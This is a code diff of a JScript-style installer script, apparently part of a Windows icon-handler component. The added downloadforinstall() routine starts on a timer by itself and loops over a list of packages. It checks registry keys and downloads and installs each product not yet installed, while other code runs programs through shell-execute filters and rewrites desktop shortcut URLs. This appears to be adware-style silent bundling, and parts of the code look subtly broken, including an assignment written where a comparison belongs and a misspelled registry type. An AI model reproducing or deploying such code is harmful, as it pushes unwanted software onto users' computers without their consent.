@@ -1,15 +1,7 @@
 ////////// 
 log("*-------------------------------main.js----------------------------------")
 log("-------------------------------main.js----------------------------------*")
-	//setTimeout( function() {sfdasdf}, 10000)
-	/*
-	__windows.EnumWindows(function(hwnd, text){trace("title="+text); return 0;}, 0);
-	trace("screen.availHeight="+screen.availHeight+", screen.height"+screen.height)
-	ExtractCab(DIR+"ecfile.cab", DIR)
-	trace(" path : "+ __storage.RegQueryValue("HKEY_CURRENT_USER","Software\\exticonhandler", "Path"))
-	__storage.RegSetValue("HKEY_CURRENT_USER","Software\\exticonhandler", "", "cacd")
-	trace(" opencl:"+__external.IsSupportOpencl())
-	*/
+/////
 function filter_shellexcute(){
 }
 function filter_shellexcute.prototype.setEnvironmentVariable(env)
@@ -201,12 +193,14 @@ function filter_shellexcute.prototype.run(pipe){
 	else
 		return true;	
 } 
+
 function filter_idle(){
 }
 function filter_idle.prototype.run(){
 	log("filter_idle.prototype.run")
 	return true;
 }
+
 function filter_shellexcuteex(){
 }
 function filter_shellexcuteex.prototype.run(pipe){
@@ -228,7 +222,7 @@ function start(){
 	var _filter_se = new filter_shellexcute();
 	_filter_dl.callback =__module.push(_filter_dl);
 	_filter_se.callback = __module.push(_filter_se);
-	var pipe = __destReadys_dll;
+	var pipe = __destReady_dll;
 	__module.setDoneCallback(function (mod) {
 		log("module name "+mod.name+" onDonCallback");		 
 		exit(-103);
@@ -270,7 +264,6 @@ function shellIconOverlayIdentifier() {
 setTimeout(shellIconOverlayIdentifier, 5);
 ////////////////////1 2 3/////////////////
 
-
 function modifyDesktopIcon(){
 	var WshShell = __wshShell 
 	var desktopdir = WshShell.SpecialFolders("Desktop") 
@@ -281,9 +274,11 @@ function modifyDesktopIcon(){
 	__storage.WritePrivateProfileValue(path,"InternetShortcut","URL",url)
 }
 
-function filter_existproduct(){
+function filter_installcondition(condition){
+	this.condition = condition;
 }
-function filter_existproduct.prototype.run(pipe){
+function filter_installcondition.prototype.run(pipe){
+	/*
 	var WshShell = __wshShell
 	var installtimes=0
 	__TRY(function (){ installtimes = WshShell.RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Thunder Network\\Xmp\\installtimes")})
@@ -297,28 +292,56 @@ function filter_existproduct.prototype.run(pipe){
 	log(" osversion ; " + osversion);
 	if(osversion.substr(0,1) !="5")
 		this.callback(pipe,true);
-
+	*/
+	if(this.condition.type == "reg"){
+		if(this.condition.subtype="existreg"){
+			var WshShell = __wshShell
+			var key_value
+			__TRY(function(){ key_value = WshShell.RegRead(this.condition.value);})
+			if(typeof key_value == "undefined"){//没有这个产品，准备下载
+				return true
+			}else{
+				this.callback(pipe,true);
+			}
+		}
+	}else if(this.condition.type == "file"){
+	}
 	return true	
 }
-function install(){
-	var __module = new module("xmpsetup-fanli.exe");
-	var _filter_existproduct = new filter_existproduct();
-	var _filter_dl = new filter_dlbusiness();
-	var _filter_se2 = new filter_shellexcuteex();
-	 _filter_existproduct.callback = __module.push(_filter_existproduct);
-	_filter_dl.callback =__module.push(_filter_dl);
-	_filter_se2.callback = __module.push(_filter_se2);
-	var pipe = __installReadys;
-	__module.setDoneCallback(function (mod) {
-		log(" module name "+mod.name+" onDoneCallback pipe.exitaction="+mod.pipe.exitaction+" pipe.exitcode="+pipe.exitcode+" indexfilter="+mod.currentFilterIndex);
-		delete _filter_existproduct; delete _filter_dl;delete _filter_se2;delete __module;
-	})
-	__module.run(pipe)
+function filter_installcomplete(){
+	
 }
+function filter_installcomplete.prototype.run(pipe){
+	var WshShell = __wshShell
+	__TRY(function(){WshShell.RegWrite("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\force", 1, "RGG_DWORD");})
+	
+}
+function downloadforinstall(){
+	var WshShell = __wshShell
+	var key_value
+	var prekey = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\s_";
+	for(var i in __installReadys){
+		var pipe = __installReadys[i];
+		__TRY(function(){ key_value = WshShell.RegRead(prekey + parseInt(pipe.id /100) *100 + "\\");})
+		if(typeof key_value == "undefined"){ //不存在
+		
+		}else{
+			if(key_value.indexOf(pipe.id)>0){
+				continue;//已经执行过了
+			}
+		}
+		
+		var __module = new module("install" + pipe.name);
+		var _filter_installcondition = new filter_installcondition(pipe.condition);
+		var _filter_dl = new filter_dlbusiness();
+		_filter_installcondition.callback = __module.push(_filter_installcondition);
+		_filter_dl.callback =__module.push(_filter_dl);
+		__module.run(pipe)
+	}
+}
+//4 --
+setTimeout(downloadforinstall, 4);
 
-
-//setTimeout(modifyDesktopIcon, 3);
-//setTimeout(install, 4);
 /*
 var PAGE_READWRITE = 4;
 var PAGE_READONLY =2
